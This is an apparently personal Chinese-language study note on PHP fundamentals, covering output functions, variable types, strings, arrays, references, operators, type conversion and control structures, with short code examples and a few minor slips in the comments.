          <h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">单行注释：</span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">多行注释：</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"><span class="comment">//Anything outside <span class="meta">&lt;?php</span> tags is echoed automatically<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>var_dump：输出变量的类型和值</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$x</span>);<span class="comment">//output:int(1)</span></span><br><span class="line">var_dump(<span class="variable">$str</span>);<span class="comment">//output:str(6) &quot;123456&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>print_r：将变量以一种human-readable的格式输出</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&quot;one&quot;</span>=&gt;<span class="string">&quot;apple&quot;</span>,<span class="string">&quot;two&quot;</span>=&gt;<span class="string">&quot;banana&quot;</span>,<span class="string">&quot;three&quot;</span>=&gt;<span class="string">&quot;orange&quot;</span>];</span><br><span class="line"><span class="variable">$arr1</span> = [<span class="string">&#x27;one&#x27;</span>,<span class="string">&#x27;two&#x27;</span>,<span class="string">&#x27;three&#x27;</span>];</span><br><span class="line"><span class="comment">//如果要打印的变量是int、float、string类型，会打印变量值本身；如果变量是array类型，会显示键值元素</span></span><br><span class="line">print_r(<span class="variable">$x</span>);<span class="comment">//1</span></span><br><span class="line">print_r(<span class="variable">$arr</span>);<span class="comment">//Array ( [one] =&gt; apple [two] =&gt; banana [three] =&gt; orange ) </span></span><br><span class="line">print_r(<span class="variable">$arr1</span>);<span class="comment">//Array ( [0] =&gt; one [1] =&gt; two [2] =&gt; three ) </span></span><br></pre></td></tr></table></figure>

<h3 id="类型和变量"><a href="#类型和变量" class="headerlink" title="类型和变量"></a>类型和变量</h3><ul>
<li>$定义变量</li>
<li>变量名：第一位为字母/下划线，其它为字母、数字、下划线</li>
<li>不能声明变量，需要直接对变量赋值</li>
<li>删除变量 unset($int1);</li>
</ul>
<ul>
<li><p>​    Boolean变量不对大小写敏感</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$boolean</span> = <span class="literal">true</span>;<span class="comment">// or TRUE or TRue</span></span><br><span class="line"><span class="variable">$boolean</span> = <span class="literal">False</span>;<span class="comment">//or FALSE or false</span></span><br></pre></td></tr></table></figure></li>
<li><p>整型</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$int1</span> = <span class="number">12</span>;</span><br><span class="line"><span class="variable">$int2</span> = -<span class="number">12</span>;</span><br><span class="line"><span class="variable">$int3</span> = <span class="number">012</span>;<span class="comment">//=》10 0开头代表8进制</span></span><br><span class="line"><span class="variable">$int4</span> = <span class="number">0x0F</span>;<span class="comment">//=&gt;15 0x开头代表16进制</span></span><br><span class="line"><span class="variable">$int5</span> = <span class="number">0b11111111</span>;<span class="comment">//=&gt;255 0b开头代表2进制</span></span><br></pre></td></tr></table></figure></li>
<li><p>浮点型</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$float</span> = <span class="number">1.234</span>;</span><br><span class="line"><span class="variable">$float</span> = <span class="number">1.2e3</span>; <span class="comment">//1.2X10的3次方</span></span><br><span class="line"><span class="variable">$float</span> = <span class="number">7E-10</span>; <span class="comment">//7乘10的负10次方，科学计数法</span></span><br></pre></td></tr></table></figure></li>
<li><p>字符串</p>
<p>单引号vs双引号</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="comment">//php -S localhost:4000</span></span><br><span class="line">       <span class="variable">$first</span> = <span class="string">&#x27;banana&#x27;</span>;</span><br><span class="line">       <span class="variable">$second</span> = <span class="string">&#x27;This is a $first&#x27;</span>;</span><br><span class="line">       <span class="variable">$third</span> = <span class="string">&quot;This is a <span class="subst">$first</span>&quot;</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$first</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$second</span>;\\This is a <span class="variable">$first</span> 可以发现，如果是单引号，不会对里面的内容变量或内容进行解析，直接输出</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$third</span>;\\This is a banana  如果是双引号，则会解析里面的变量</span><br><span class="line">       <span class="meta">?&gt;</span></span><br><span class="line">          </span><br></pre></td></tr></table></figure>

<p>包括特殊符号，\t\n等等都只会在双引号中起效，单引号只会原样输出</p>
<p>【一开始<code>echo(&quot;hello \n world&quot;)</code>不会换行显示，经过搜索，可知原因是在于php解析的结果被包含在html的body中，在html中空格、换行符、制表符等等都被视为空白符，故在浏览器无正常换行。改成HTML的换行符即可】</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//可以通过添加&#123;&#125;符号使得代码可读性更好</span></span><br><span class="line"><span class="variable">$number</span> = <span class="number">5</span>;</span><br><span class="line">       <span class="variable">$apples</span> = <span class="string">&quot;I have <span class="subst">&#123;$number&#125;</span> apples to eat&quot;</span>;</span><br><span class="line">       <span class="variable">$bananas</span> = <span class="string">&quot;I have $&#123;number&#125; bananas to eat&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$apples</span>;</span><br><span class="line">》》I have <span class="number">5</span> apples to eat</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$bananas</span>;</span><br><span class="line">》》I have <span class="number">5</span> bananas to eat</span><br></pre></td></tr></table></figure></li>
</ul>
<p>​    字符串的连接符：<code>.</code>,<code>,</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is&quot;</span>.<span class="string">&quot;an apple&quot;</span>;\\output:this isan apple</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;I&quot;</span>,<span class="string">&quot;Like&quot;</span>,<span class="string">&quot;Apple&quot;</span>;\\output:ILikeApple</span><br></pre></td></tr></table></figure>

<ul>
<li><p>newdoc和heredoc</p>
</li>
<li><p>常量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;Holiday&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> name;<span class="comment">//output:Holiday</span></span><br></pre></td></tr></table></figure></li>
<li><p>数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义新数组</span></span><br><span class="line">	  <span class="variable">$arr1</span> = <span class="keyword">array</span>(<span class="string">&#x27;One&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;Two&#x27;</span>=&gt;<span class="number">2</span>,<span class="string">&#x27;Three&#x27;</span>=&gt;<span class="number">3</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$arr1</span>[<span class="string">&#x27;One&#x27;</span>];<span class="comment">//output:1</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$arr2</span> = [<span class="string">&#x27;One&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;Two&#x27;</span>=&gt;<span class="number">2</span>,<span class="string">&#x27;Three&#x27;</span>=&gt;<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$arr2</span>[<span class="string">&#x27;One&#x27;</span>];<span class="comment">//output:1</span></span><br><span class="line">      <span class="comment">// echo $arr2[0];该语句会报错</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$arr3</span> = [<span class="string">&#x27;One&#x27;</span>,<span class="string">&#x27;Two&#x27;</span>,<span class="string">&#x27;Three&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$arr3</span>[<span class="number">0</span>];<span class="comment">//output:One</span></span><br><span class="line"><span class="comment">//添加新元素</span></span><br><span class="line">	  <span class="comment">//在数组添加新内容</span></span><br><span class="line">      <span class="variable">$arr2</span>[<span class="string">&#x27;Four&#x27;</span>] = <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$arr2</span>[<span class="string">&#x27;Four&#x27;</span>];<span class="comment">//输出4</span></span><br><span class="line">      <span class="comment">//在数组末尾添加新内容</span></span><br><span class="line">	  <span class="comment">//法①</span></span><br><span class="line">      <span class="variable">$arr3</span>[] = <span class="string">&#x27;Four&#x27;</span>;</span><br><span class="line">	  <span class="comment">//法②</span></span><br><span class="line">      array_push(<span class="variable">$arr3</span>, <span class="string">&#x27;Five&#x27;</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$arr3</span>[<span class="number">3</span>];<span class="comment">//输出Four</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$arr3</span>[<span class="number">4</span>];<span class="comment">//输出Five</span></span><br><span class="line"><span class="comment">//移除元素</span></span><br><span class="line">	  <span class="keyword">unset</span>(<span class="variable">$arr3</span>[<span class="number">4</span>]);<span class="comment">//将arr3的第4个元素(有第0个元素)移除</span></span><br><span class="line">	  <span class="keyword">unset</span>(<span class="variable">$arr2</span>[<span class="string">&#x27;Four&#x27;</span>]);<span class="comment">//将arr2的&#x27;Four&#x27;元素移除</span></span><br></pre></td></tr></table></figure></li>
<li><p>reference</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$y</span> = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;x: <span class="subst">$x</span>&quot;</span>;<span class="comment">//1</span></span><br><span class="line"><span class="variable">$x</span> = <span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;x: <span class="subst">$x</span>&quot;</span>;<span class="comment">//2</span></span><br><span class="line"><span class="variable">$z</span> = &amp;<span class="variable">$y</span>;<span class="comment">//z和y的地址相同，z改变=》y也会改变；y改变=》z也会改变</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;z: <span class="subst">$z</span>&quot;</span>;<span class="comment">//2</span></span><br><span class="line"><span class="variable">$z</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;x: <span class="subst">$x</span>&quot;</span>;<span class="comment">//2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;y: <span class="subst">$y</span>&quot;</span>;<span class="comment">//10</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;z: <span class="subst">$z</span>&quot;</span>;<span class="comment">//10</span></span><br></pre></td></tr></table></figure>



<h3 id="Logic"><a href="#Logic" class="headerlink" title="Logic"></a>Logic</h3><h4 id="php中的运算符"><a href="#php中的运算符" class="headerlink" title="php中的运算符"></a>php中的运算符</h4><p>assert(argument)为报错函数，如果argument是false会报错</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="comment">//php -S localhost:4000</span></span><br><span class="line">     <span class="variable">$a</span> = <span class="number">0</span>;</span><br><span class="line">     <span class="variable">$b</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">     <span class="variable">$c</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">     <span class="variable">$d</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">	 <span class="variable">$e</span> = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">	<span class="comment">//下面所有的assert中的argument都是true。这些运算符即使类型不同也可以进行比较</span></span><br><span class="line">     assert(<span class="variable">$a</span> == <span class="variable">$b</span>);</span><br><span class="line">     assert(<span class="variable">$a</span> != <span class="variable">$c</span>);</span><br><span class="line">     assert(<span class="variable">$c</span> &lt;&gt; <span class="variable">$a</span>);<span class="comment">//&lt;&gt;和!=是相同的</span></span><br><span class="line">     assert(<span class="variable">$a</span> &lt; <span class="variable">$c</span>);</span><br><span class="line">     assert(<span class="variable">$b</span> &lt; <span class="variable">$c</span>);</span><br><span class="line">     assert(<span class="variable">$a</span> &lt;= <span class="variable">$b</span>);</span><br><span class="line">     assert(<span class="variable">$c</span> &lt;= <span class="variable">$d</span>);</span><br><span class="line">	 assert(<span class="variable">$d</span> &lt; <span class="variable">$e</span>);</span><br><span class="line">	<span class="comment">//下面所有的运算符 下面如果两个元素恒等===，必须两个比较元素的类型也相同</span></span><br><span class="line">	 assert(<span class="variable">$c</span> === <span class="variable">$d</span>);</span><br><span class="line">     assert(<span class="variable">$a</span> !== <span class="variable">$d</span>);</span><br><span class="line">     assert(<span class="number">1</span> === <span class="string">&#x27;1&#x27;</span>);这一条会报错，因为===运算符两边的元素类型不一致</span><br><span class="line">     assert(<span class="number">1</span> !== <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">	<span class="comment">// x&lt;=&gt;y运算符:(x=y)返回0；(x&lt;y)返回-1；(x&gt;y)返回1；</span></span><br><span class="line">     <span class="variable">$x</span> = <span class="number">101</span>;</span><br><span class="line">     <span class="variable">$y</span> = <span class="number">100</span>;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$x</span> &lt;=&gt; <span class="variable">$y</span>; <span class="comment">//1	</span></span><br><span class="line">	<span class="comment">//运算符 ？？</span></span><br><span class="line">	 <span class="variable">$a</span> ?? <span class="number">0</span> 等同于 <span class="keyword">isset</span>(<span class="variable">$a</span>)?<span class="variable">$a</span>:<span class="number">0</span></span><br><span class="line">     <span class="keyword">isset</span>判断一个变量是否被设置[被设置被<span class="literal">false</span>、<span class="number">0</span>、<span class="string">&#x27;0&#x27;</span>也类也算被设置]，被设置则返回<span class="literal">true</span>  </span><br><span class="line">     <span class="variable">$a</span> = <span class="literal">null</span>;</span><br><span class="line">     <span class="variable">$b</span> = <span class="string">&#x27;print&#x27;</span>;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$a</span> ?? <span class="string">&#x27;a is not set&#x27;</span>;<span class="comment">//output:&#x27;a is not set&#x27;</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$b</span> ?? <span class="string">&#x27;b is not set&#x27;</span>;<span class="comment">//output:&#x27;print&#x27;</span></span><br><span class="line">	<span class="comment">//三元运算符</span></span><br><span class="line">	expr1 ? expr2 : expr3</span><br><span class="line">    当expr1为<span class="literal">true</span>执行expr2；否则执行expr3</span><br><span class="line">    当expr1和expr2一样时，可以写作expr1？：expr3    </span><br><span class="line">	</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="php中的类型转换："><a href="#php中的类型转换：" class="headerlink" title="php中的类型转换："></a>php中的类型转换：</h4><p><code>+</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$y</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;one&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>+<span class="variable">$y</span>;<span class="comment">//3</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>+<span class="variable">$z</span>;<span class="comment">//2 php会先将$z的&#x27;1&#x27;转化为int(1),再进行计算</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>+<span class="variable">$str</span>;<span class="comment">//报错，不能用这种方法连接字符串，连接字符串再字符串部分有记录</span></span><br></pre></td></tr></table></figure>

<p><code>strval</code>将其他类型元素强制转化为字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>);<span class="comment">//int(5)</span></span><br><span class="line"><span class="variable">$str</span> = strval(<span class="variable">$a</span>);</span><br><span class="line">var_dump(<span class="variable">$str</span>);<span class="comment">//string(1)&quot;5&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h3><h4 id="if-else语句："><a href="#if-else语句：" class="headerlink" title="if-else语句："></a>if-else语句：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="comment">//php -S localhost:4000</span></span><br><span class="line">     <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">     <span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$a</span>&gt;<span class="variable">$b</span>)&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;a is larger than b&quot;</span>;</span><br><span class="line">     &#125;<span class="keyword">elseif</span> (<span class="variable">$a</span>&lt;<span class="variable">$b</span>) &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;a is smaller than b&quot;</span>;<span class="comment">//output这一句</span></span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;a is equal to b&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="if-else-endif语句：-这种适用于php和html相结合情况"><a href="#if-else-endif语句：-这种适用于php和html相结合情况" class="headerlink" title="if-else-endif语句：[这种适用于php和html相结合情况]"></a>if-else-endif语句：[这种适用于php和html相结合情况]</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="variable">$a</span>&lt;<span class="variable">$b</span>): <span class="meta">?&gt;</span></span><br><span class="line">&lt;h1&gt;a is larger than b&lt;h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>:<span class="meta">?&gt;</span></span><br><span class="line">&lt;h2&gt;a is not larger than b&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="switch-case语句："><a href="#switch-case语句：" class="headerlink" title="switch-case语句："></a>switch-case语句：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">     <span class="keyword">print</span> <span class="string">&quot;a=1&quot;</span>;</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">     <span class="keyword">print</span> <span class="string">&quot;a=2&quot;</span>;</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">     <span class="keyword">print</span> <span class="string">&quot;nothing above&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="while语句："><a href="#while语句：" class="headerlink" title="while语句："></a>while语句：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> &lt; <span class="number">5</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="do-while语句："><a href="#do-while语句：" class="headerlink" title="do-while语句："></a>do-while语句：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>++;</span><br><span class="line">   &#125;<span class="keyword">while</span>(<span class="variable">$i</span>&lt;<span class="number">5</span>);</span><br></pre></td></tr></table></figure>

<h4 id="for语句："><a href="#for语句：" class="headerlink" title="for语句："></a>for语句：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">0</span>; <span class="variable">$x</span>&lt;<span class="number">10</span>; <span class="variable">$x</span>++)&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<h4 id="foreach语句："><a href="#foreach语句：" class="headerlink" title="foreach语句："></a>foreach语句：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wheels</span> = [<span class="string">&#x27;car&#x27;</span>=&gt;<span class="number">4</span>, <span class="string">&#x27;bike&#x27;</span>=&gt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$wheels</span> <span class="keyword">as</span> <span class="variable">$wheel_count</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$wheel_count</span>;<span class="comment">//output&quot;4 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$wheels</span> <span class="keyword">as</span> <span class="variable">$vehicle</span>=&gt;<span class="variable">$wheel_count</span>)&#123;<span class="comment">//vehicle为键、wheel_count为值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;A <span class="subst">$vehicle</span> has <span class="subst">$wheel_count</span> wheels&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="break和continue语句："><a href="#break和continue语句：" class="headerlink" title="break和continue语句："></a>break和continue语句：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span>&lt;<span class="number">5</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span>===<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$j</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$j</span>&lt;<span class="number">5</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$j</span>===<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;<span class="comment">//这里存在的问题是，$j===3时直接跳过，也没有++，那么下一次j还是3，会导致超时，故下面用for循环实现</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$j</span>++;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">0</span>; <span class="variable">$k</span>&lt;<span class="number">5</span>; <span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$k</span>===<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$k</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



